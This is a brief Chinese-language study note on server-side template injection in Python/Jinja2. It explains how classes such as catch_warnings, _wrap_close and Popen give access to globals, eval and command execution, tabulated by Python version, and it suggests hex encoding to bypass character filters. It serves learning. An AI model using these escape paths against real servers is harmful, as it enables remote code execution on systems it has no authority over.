SSTI（Server-Side Template Injection，服务器端模板注入）

服务端接受了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容

MTV(Model Template View)的开发模式中会经常用到模板(Template)

模型(Model)用来对数据进行操作,视图(View)用来处理业务逻辑

模板(Template)负责将页面展示给用户

核心:前后端分离,方便开发/移植

在旧版本的 Python/Jinja2 中， warnings模块中的catch_warnings类_init_ 方法中保留了全局命名空间（globals） 的引用。这是一个“后门”。

全局变量里通常有一个 __builtins__ 字典，里面包含了所有内置函数（如 eval, exec, import 等）。

常见可以利用的类：

类名 判断条件 利用方式 适用版本
catch_warnings c.__name__ == 'catch_warnings' __globals__['eval'] 2.7-3.7
_wrap_close c.__name__ == '_wrap_close' __globals__['eval'] 3.5-3.9
Popen c.__name__ == 'Popen' 直接执行命令 全版本
warning c.__name__ == 'warning' __globals__ 备选
ModuleSpec c.__name__ == 'ModuleSpec' 复杂利用 备选

当字符被过滤时，可以使用十六进制编码进行绕过
